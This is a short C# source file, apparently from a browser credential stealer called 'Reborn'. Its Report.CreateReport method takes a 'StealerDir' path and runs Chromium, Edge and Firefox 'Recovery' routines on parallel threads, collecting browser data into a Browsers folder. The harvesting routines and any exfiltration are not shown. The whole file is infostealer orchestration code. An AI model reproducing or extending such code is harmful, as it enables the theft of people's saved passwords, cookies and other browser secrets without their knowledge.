using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace Reborn
{
    class Report
    {
        public static void CreateReport()
        {
            string Stealer_Dir = Help.StealerDir;
            // List with threads
            List<Thread> Threads = new List<Thread>();
            try
            {
                Threads.Add(new Thread(() =>
                {
                    Chromium.Recovery.Run(Stealer_Dir + "\\Browsers");
                    Edge.Recovery.Run(Stealer_Dir + "\\Browsers");
                }));

                Threads.Add(new Thread(() =>
                   Firefox.Recovery.Run(Stealer_Dir + "\\Browsers")
               ));
                
                // Start all threads
                foreach (Thread t in Threads)
                    t.Start();
                // Wait all threads
                foreach (Thread t in Threads)
                    t.Join();
               // URLSearcher.GetDomainDetect(Stealer_Dir + "\\Browsers\\");
            }
            catch(Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
